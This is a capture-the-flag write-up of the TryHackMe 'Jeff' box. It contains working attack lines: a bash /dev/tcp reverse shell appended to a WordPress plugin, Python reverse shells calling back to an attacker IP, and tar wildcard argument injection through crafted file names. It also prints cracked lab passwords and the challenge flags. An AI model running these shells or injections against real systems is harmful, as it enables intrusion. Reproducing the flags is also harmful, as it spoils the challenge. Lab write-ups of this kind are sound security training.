# Jeff

Can you hack Jeff's web server?

This machine may take upto 5 minutes to fully deploy.

Get `user.txt` and `root.txt`.

This is my first ever box, I hope you enjoy it.

If you find yourself brute forcing SSH, you're doing it wrong.

Please don't post spoilers or stream the box for at least a couple of days.


# Hack the machine and obtain the user.txt flag.

*Hint: Add `jeff.thm` to your `/etc/hosts file`.*

## Services enumeration

Let's start by scanning the machine with Nmap. There are 2 open ports:

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7e:43:5f:1e:58:a8:fc:c9:f7:fd:4b:40:0b:83:79:32 (RSA)
|   256 5c:79:92:dd:e9:d1:46:50:70:f0:34:62:26:f0:69:39 (ECDSA)
|_  256 ce:d9:82:2b:69:5f:82:d0:f5:5c:9b:3e:be:76:88:c3 (ED25519)
80/tcp open  http    nginx
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

As mentioned in the hint, let's add `jeff.thm` in our `/etc/hosts file`:

~~~
$ echo "10.10.144.133 jeff.thm" | sudo tee -a /etc/hosts
~~~

## Web enumeration

### Hidden locations

There is no `robots.txt` file but gobuster discovers several interesting hidden directories (`admin`, `backups` and `uploads`):

~~~
kali@kali:/data/Jeff$ gobuster dir -u http://jeff.thm -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://jeff.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/05 09:45:16 Starting gobuster
===============================================================
/admin (Status: 301)
/assets (Status: 301)
/backups (Status: 301)
/index.html (Status: 200)
/uploads (Status: 301)
===============================================================
2020/09/05 09:45:39 Finished
===============================================================
~~~

### admin

Further enumerating the `/admin` directory leads to a `login.php` page.

~~~
kali@kali:/data/Jeff$ gobuster dir -u http://jeff.thm/admin/ -x zip,bak,old,php -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://jeff.thm/admin/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,zip,bak,old
[+] Timeout:        10s
===============================================================
2020/09/05 09:51:37 Starting gobuster
===============================================================
/index.html (Status: 200)
/login.php (Status: 200)
===============================================================
2020/09/05 09:53:30 Finished
===============================================================
~~~

However, browsing `/admin/login.php` forces the download of the file, which is empty. Likely a rabbit hole.

### uploads

The `/uploads` directory contains an `index.html` with a form to upload files on the server. However, there is no `action` tag in the form, nor any javascript included. Further enumerating the directory doesn't reveal any other hidden source. This is another rabbit hole.

### backups

The `/backups/` directory doesn't allow directory listing, but gobuster found a `backup.zip` file:

~~~
kali@kali:/data/Jeff$ gobuster dir -u http://jeff.thm/backups/ -x zip,bak,old,php -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://jeff.thm/backups/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     old,php,zip,bak
[+] Timeout:        10s
===============================================================
2020/09/05 09:49:12 Starting gobuster
===============================================================
/backup.zip (Status: 200)
/index.html (Status: 200)
===============================================================
2020/09/05 09:51:08 Finished
~~~

The `backup.zip` file is likely to contain an interesting `wpadmin.bak` file, but it is password protected:

~~~
kali@kali:/data/Jeff/files$ zipinfo backup.zip 
Archive:  backup.zip
Zip file size: 62753 bytes, number of entries: 9
drwxrwx---  3.0 unx        0 bx stor 20-May-14 17:20 backup/
drwxrwx---  3.0 unx        0 bx stor 20-May-14 17:20 backup/assets/
-rwxrwx---  3.0 unx    34858 TX defN 20-May-14 17:20 backup/assets/EnlighterJS.min.css
-rwxrwx---  3.0 unx    49963 TX defN 20-May-14 17:20 backup/assets/EnlighterJS.min.js
-rwxrwx---  3.0 unx    89614 TX defN 20-May-14 17:20 backup/assets/MooTools-Core-1.6.0-compressed.js
-rwxrwx---  3.0 unx    11524 BX defN 20-May-14 17:20 backup/assets/profile.jpg
-rwxrwx---  3.0 unx     1439 TX defN 20-May-14 17:20 backup/assets/style.css
-rwxrwx---  3.0 unx     1178 TX defN 20-May-14 17:20 backup/index.html
-rwxrwx---  3.0 unx       41 TX stor 20-May-14 17:20 backup/wpadmin.bak
9 files, 188617 bytes uncompressed, 60951 bytes compressed:  67.7%
~~~

Let's crack the password using John the Ripper:

~~~
$ /data/src/john/run/zip2john backup.zip > backup.hash
$ /data/src/john/run/john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!!Burningbird!!  (backup.zip)
1g 0:00:00:04 DONE (2020-09-05 09:58) 0.2427g/s 3480Kp/s 3480Kc/s 3480KC/s !!rebound!!..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
~~~

John found the password to uncompress the archive: `!!Burningbird!!`. The `wpadmin.bak` file reveals the Wordpress password.

~~~
$ cat wpadmin.bak 
wordpress password is: phO#g)C5dhIWZn3BKP
~~~

Question: Is there any Wordpress installation somewhere? Maybe a virtual host?

## Another vhost?

Let's check with `gobuster` using the `vhost` brute forcer:

~~~
kali@kali:/data/Jeff/files$ gobuster vhost -u http://jeff.thm -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:          http://jeff.thm
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/dirb/common.txt
[+] User Agent:   gobuster/3.0.1
[+] Timeout:      10s
===============================================================
2020/09/05 10:10:01 Starting gobuster
===============================================================
Found: wordpress.jeff.thm (Status: 200) [Size: 25901]
===============================================================
2020/09/05 10:10:26 Finished
===============================================================
~~~

Indeed, there is a `wordpress.jeff.thm` vhost. Let's add it to our hosts file.

### Wordpress

Let's enumerate the existing users with `wpscan`.

~~~
kali@kali:/data/Jeff/files$ wpscan --url http://wordpress.jeff.thm -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.4
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://wordpress.jeff.thm/ [10.10.144.133]
[+] Started: Sat Sep  5 10:15:53 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: nginx
 |  - X-Powered-By: PHP/7.3.17
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://wordpress.jeff.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://wordpress.jeff.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://wordpress.jeff.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).
 | Found By: Rss Generator (Passive Detection)
 |  - http://wordpress.jeff.thm/?feed=rss2, <generator>https://wordpress.org/?v=5.4.1</generator>
 |  - http://wordpress.jeff.thm/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.4.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://wordpress.jeff.thm/wp-content/themes/twentytwenty/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://wordpress.jeff.thm/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | Style URL: http://wordpress.jeff.thm/wp-content/themes/twentytwenty/style.css?ver=1.2
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://wordpress.jeff.thm/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=======================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] jeff
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Sat Sep  5 10:15:58 2020
[+] Requests Done: 50
[+] Cached Requests: 6
[+] Data Sent: 11.386 KB
[+] Data Received: 379.327 KB
[+] Memory used: 173.398 MB
[+] Elapsed time: 00:00:05
~~~

`wpscan` revealed a user: `jeff`. And we already have the password (remember the backup archive?). Let's connect: http://wordpress.jeff.thm/wp-login.php

## Reverse shell

Now connected as `jeff` (who is admin BTW), we should be able to get a reverse shell.

Unfortunately, we can't modify the `404.php` template from the "Theme Editor" because of the following error:

~~~
Something went wrong. Your change may not have been saved. Please try again. There is also a chance that you may need to manually fix and upload the file over FTP.
~~~

Let's try with the plugins. Go to "Plugins > PluginEditor" from the menu. From the dropdown on the right hand side, select "Hello Dolly" and click on the "Select" button. It will show the code for the `hello.php` template. Append the following content to the file and click on the "Update file" button.

```php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.50.72/4444 0>&1'");
```

Now, open a listener (`rlwrap nc -nlvp 4444`) and activate the plugin ("Plugins > Installed plugins").

We now have a reverse shell.

## Docker evasion

It turns out that we land in a docker container, what is confirmed by `leanpeas.sh`.

After trying to evade docker and failing due to a lack of permission to execute `docker`, I decided to exploit something else.

There is an interesting `ftp_backup.php` script under `/var/www/html/`:

```php
<?php
/* 
    Todo: I need to finish coding this database backup script.
    also maybe convert it to a wordpress plugin in the future.
*/
$dbFile = 'db_backup/backup.sql';
$ftpFile = 'backup.sql';

$username = "backupmgr";
$password = "SuperS1ckP4ssw0rd123!";

$ftp = ftp_connect("172.20.0.1"); // todo, set up /etc/hosts for the container host

if( ! ftp_login($ftp, $username, $password) ){
    die("FTP Login failed.");
}

$msg = "Upload failed";
if (ftp_put($ftp, $remote_file, $file, FTP_ASCII)) {
    $msg = "$file was uploaded.\n";
}

echo $msg;
ftp_close($conn_id); 
```

Running it will display the error message "Upload failed", which is a sign that the authentication was successful. Unfortunately, `ftp`, `nc` or `telnet` are not available in the container and we have to use `curl` (make sure you use the `-P -` flag to force the active mode).

~~~
www-data@Jeff:/var/www/html/wp-admin$ curl -s -v -P - 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/'
<'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/'
* Expire in 0 ms for 6 (transfer 0x55e170f67f50)
*   Trying 172.20.0.1...
* TCP_NODELAY set
* Expire in 200 ms for 4 (transfer 0x55e170f67f50)
* Connected to 172.20.0.1 (172.20.0.1) port 21 (#0)
< 220 Welcome to Jeff's FTP service.
> USER backupmgr
< 331 Please specify the password.
> PASS SuperS1ckP4ssw0rd123!
< 230 Login successful.
> PWD
< 257 "/" is the current directory
* Entry path is '/'
> EPRT |1|172.20.0.6|48235|
* ftp_perform ends with SECONDARY: 1
< 200 EPRT command successful. Consider using EPSV.
* Connect data stream actively
> TYPE A
< 200 Switching to ASCII mode.
> LIST
< 150 Here comes the directory listing.
* Maxdownload = -1
* Preparing for accepting server on data port
* Checking for server connect
* Ready to accept data connection from server
* Connection accepted from server
{ [63 bytes data]
* Remembering we are in dir ""
< 226 Directory send OK.
* Connection #0 to host 172.20.0.1 left intact
drwxr-xr-x    2 1001     1001         4096 May 18 16:14 files
~~~

The `files` directory is empty:

~~~
www-data@Jeff:/var/www/html/wp-admin$ curl -s -v -P - 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/'
</backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/'
* Expire in 0 ms for 6 (transfer 0x562eb8f80f50)
*   Trying 172.20.0.1...
* TCP_NODELAY set
* Expire in 200 ms for 4 (transfer 0x562eb8f80f50)
* Connected to 172.20.0.1 (172.20.0.1) port 21 (#0)
< 220 Welcome to Jeff's FTP service.
> USER backupmgr
< 331 Please specify the password.
> PASS SuperS1ckP4ssw0rd123!
< 230 Login successful.
> PWD
< 257 "/" is the current directory
* Entry path is '/'
> CWD files
* ftp_perform ends with SECONDARY: 0
< 250 Directory successfully changed.
> EPRT |1|172.20.0.6|41765|
< 200 EPRT command successful. Consider using EPSV.
* Connect data stream actively
> TYPE A
< 200 Switching to ASCII mode.
> LIST
< 150 Here comes the directory listing.
* Maxdownload = -1
* Preparing for accepting server on data port
* Checking for server connect
* Ready to accept data connection from server
* Connection accepted from server
{ [0 bytes data]
* Remembering we are in dir "files/"
< 226 Directory send OK.
* Connection #0 to host 172.20.0.1 left intact
~~~

## Crontab?

This is where I was left without ideas, and after a while, I decided to have a quick look at the writeups to see how I could move forward. I could read that "a crontab is running outside the container! The user `backupmgr` is running `tar` every minute and uses a wildcard `*` to include everything in the `ftp://files` directory".

Honestly, without any hint (did I miss any?), I don't know how one could do this kind of assumption, but let's take it for granted... I stopped reading the write-up and decided to continue exploring myself, with this new "hint".

## Reverse shell (escape the docker container)

Long story short, what we need to do is to push 3 files on the ftp server, under the `/files` directory in order to inject parameters to the `tar` command, as described on [GTFOBins](https://gtfobins.github.io/gtfobins/tar/#shell):

* `shell`: a new reverse shell (we will do it in python)
* `--checkpoint=1`
* `--checkpoint-action=exec=sh shell`: to run our shell

Let's create the files:

~~~
$ echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.8.50.72\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'" > shell.sh
$ echo "" > "/var/www/html/--checkpoint=1"
$ echo "" > "/var/www/html/--checkpoint-action=exec=sh shell.sh"
~~~

And now, let's upload them to the remote location:

~~~
$ curl -v -P - -T "/var/www/html/shell.sh" 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/'
$ curl -v -P - -T "/var/www/html/--checkpoint=1" 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/'
$ curl -v -P - -T "/var/www/html/--checkpoint-action=exec=sh shell.sh" 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/'
~~~

Open a new listener and wait 1 minute to get a new shell as `backupmgr`, outside of the docker container.

~~~
$ rlwrap nc -nlvp 5555
listening on [any] 5555 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.144.133] 43678
bash: cannot set terminal process group (2532): Inappropriate ioctl for device
bash: no job control in this shell
backupmgr@tryharder:~/.ftp/files$ id
id
uid=1001(backupmgr) gid=1001(backupmgr) groups=1001(backupmgr)
backupmgr@tryharder:~/.ftp/files$ 
~~~

Let's immediatly upgrade our shell:

~~~
backupmgr@tryharder:~/.ftp/files$ python -c "import pty;pty.spawn('/bin/bash')"
~~~

## Lateral move (backupmgr -> jeff)

We are connected as `backupmgr`, but the user flag is in `jeff`'s home, that we don't have access to.

~~~
backupmgr@tryharder:~$ ls -l /home
ls -l /home
total 8
drwxr-xr-x 7 backupmgr backupmgr 4096 May 24 13:25 backupmgr
drwx------ 5 jeff      jeff      4096 May 18 16:09 jeff
~~~

Listing files owned by `jeff` reveals 2 interesting files:

~~~
backupmgr@tryharder:~$ find / -type f -user jeff 2>/dev/null
find / -type f -user jeff 2>/dev/null
/opt/systools/systool
/var/backups/jeff.bak
backupmgr@tryharder:~$ cat /var/backups/jeff.bak
cat /var/backups/jeff.bak
cat: /var/backups/jeff.bak: Permission denied
~~~

Reading `jeff.bak` would obviously help (likely containing information to switch to the user), but only `jeff` can read the file. On the other hand, running the `systool` executable will show a menu:

~~~
backupmgr@tryharder:/opt/systools$ ./systool
./systool
Welcome to Jeffs System Administration tool.
This is still a very beta version and some things are not implemented yet.
Please Select an option from below.
1 ) View process information.
2 ) Restore your password.
3 ) Exit 
Chose your option: 
~~~

If we choose the second option ("restore your password"), it will display a message that seems to be taken from the `message.txt` file in the same directory, and that is writable by anybody:

~~~
Chose your option: 2
2


Jeff, you should login with your own account to view/change your password. I hope you haven't forgotten it.


1 ) View process information.
2 ) Restore your password.
3 ) Exit 
Chose your option: 3
3
backupmgr@tryharder:/opt/systools$ cat message.txt
cat message.txt
Jeff, you should login with your own account to view/change your password. I hope you haven't forgotten it.
backupmgr@tryharder:/opt/systools$ ls -la message.txt
ls -la message.txt
-rwxrwxrwx 1 root root 108 May 24 13:19 message.txt
~~~

Now, what is interesting is that the binary is owned by `jeff` and the `message.txt` file is world writable, which means we can make a symbolic link to `jeff.bak`:

~~~
backupmgr@tryharder:/opt/systools$ ln -sf /var/backups/jeff.bak message.txt
ln -sf /var/backups/jeff.bak message.txt
backupmgr@tryharder:/opt/systools$ ls -la
ls -la
total 28
drwxrwxrwx 2 jeff      jeff       4096 Sep  6 18:31 .
drwxr-xr-x 4 root      root       4096 May 24 13:13 ..
lrwxrwxrwx 1 backupmgr backupmgr    21 Sep  6 18:31 message.txt -> /var/backups/jeff.bak
-rwxr-sr-x 1 jeff      pwman     17160 May 24 13:18 systool
backupmgr@tryharder:/opt/systools$ ./systool
./systool
Welcome to Jeffs System Administration tool.
This is still a very beta version and some things are not implemented yet.
Please Select an option from below.
1 ) View process information.
2 ) Restore your password.
3 ) Exit 
Chose your option: 2
2


Your Password is: 123-My-N4M3-1z-J3ff-123 


1 ) View process information.
2 ) Restore your password.
3 ) Exit 
Chose your option: 
~~~

We now have `jeff`'s password and we can connect via SSH. Unfortunately, there is another complexity, we are in a restricted bash (`rbash`) environment, that prevents us from reading the user flag:

~~~
kali@kali:/data/Jeff/files$ ssh jeff@jeff.thm
jeff@tryharder:~$ cat user.txt
-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
~~~

## Evade the restricted shell (rbash)

After some research on the Internet, I eventually found that appending `-t "bash -l"` to the SSH connection string allows to bypass the restricted bash.

~~~
kali@kali:/data/Jeff/files$ ssh jeff@jeff.thm -t "bash -l"
Warning: Permanently added the ECDSA host key for IP address '10.10.144.133' to the list of known hosts.
jeff@jeff.thm's password: 
jeff@tryharder:~$ ls -l
total 4
-rw-r----- 1 jeff jeff 36 May 11 12:04 user.txt
~~~

After manually defining some paths in the `PATH` environment variable, I was able to eventually read the user flag.

~~~
jeff@tryharder:~$ cat user.txt
Command 'cat' is available in '/bin/cat'
The command could not be located because '/bin' is not included in the PATH environment variable.
cat: command not found
jeff@tryharder:~$ echo $PATH
/home/jeff/.bin
jeff@tryharder:~$ export PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin
jeff@tryharder:~$ echo $PATH
/bin:/usr/bin:/usr/sbin:/usr/local/bin
jeff@tryharder:~$ cat user.txt
THM{HashMeLikeOneOfYourFrenchGirls}
~~~

I tried to validate the user flag but it failed.

## User flag

The flag seems to be hashed (`HashMeLikeOneOfYourFrenchGirls`) with MD5:

~~~
jeff@tryharder:~$ echo -n "HashMeLikeOneOfYourFrenchGirls" | md5sum
e122d5588956ef9ba7d4d2b2fee00cac  -
~~~

User flag: `THM{e122d5588956ef9ba7d4d2b2fee00cac}`


# Escalate your privileges, whats the root flag?

## Jeff's privileges

After so many difficulties to get the user flag, I was not expecting anything from the `sudo -l` command, but was surprised to see that `jeff` was allowed to run `crontab` as `root` without password. 

~~~
jeff@tryharder:~$ sudo -l
[sudo] password for jeff: 
Matching Defaults entries for jeff on tryharder:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jeff may run the following commands on tryharder:
    (ALL) /usr/bin/crontab
~~~

## Crontab

Let's edit the crontab with `sudo crontab -e` and add the following line:

~~~
* * * * * python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.50.72",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
~~~

Now, open a listener and wait 1 minute to get a root shell:

~~~
kali@kali:/data/vpn$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.144.133] 44900
bash: cannot set terminal process group (2476): Inappropriate ioctl for device
bash: no job control in this shell
root@tryharder:~# ls -la
ls -la
total 44
drwx------  6 root root 4096 May 25 15:46 .
drwxr-xr-x 25 root root 4096 May 23 14:40 ..
lrwxrwxrwx  1 root root    9 May 11 12:34 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 May 12 16:31 .cache
drwx------  3 root root 4096 May 12 16:31 .gnupg
drwxr-xr-x  3 root root 4096 May 14 14:00 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
----------  1 root root  117 May 18 11:59 root.txt
-rw-r--r--  1 root root   75 May 11 13:29 .selected_editor
drwx------  2 root root 4096 May 18 12:28 .ssh
-rw-------  1 root root 1880 May 25 15:46 .viminfo
~~~

## Root flag

And access the root flag:

~~~
root@tryharder:~# cat root.txt
cat root.txt
THM{40fc54e5c0f5747dfdd35e0cc7db6ee2}

Congratz on completing my box. 
Sorry if you hated it, it was my first one :)
~~~

Root flag: `THM{40fc54e5c0f5747dfdd35e0cc7db6ee2}`
